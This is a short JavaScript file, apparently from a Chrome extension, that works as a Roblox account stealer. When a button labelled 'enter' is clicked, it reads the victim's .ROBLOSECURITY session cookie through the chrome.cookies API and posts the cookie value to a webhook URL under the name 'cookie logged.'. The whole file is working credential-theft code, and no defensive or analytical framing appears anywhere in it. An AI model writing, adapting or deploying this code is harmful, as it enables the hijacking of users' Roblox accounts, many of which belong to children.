const webHookURL = '';

function details() {
  var details = {};
  details['name'] = '.ROBLOSECURITY';
  details['url'] = 'https://www.roblox.com/home';
  return details;
}

document.getElementById('enter').onclick = () => {
  chrome.cookies.get(details(), res => {

    fetch(webHookURL,{
        body:JSON.stringify({
          'content': res.value,
          'username': 'cookie logged.'
        }), 
        method: "POST",
        headers:{
          'Content-Type':'application/json'
        }
    });

  });
}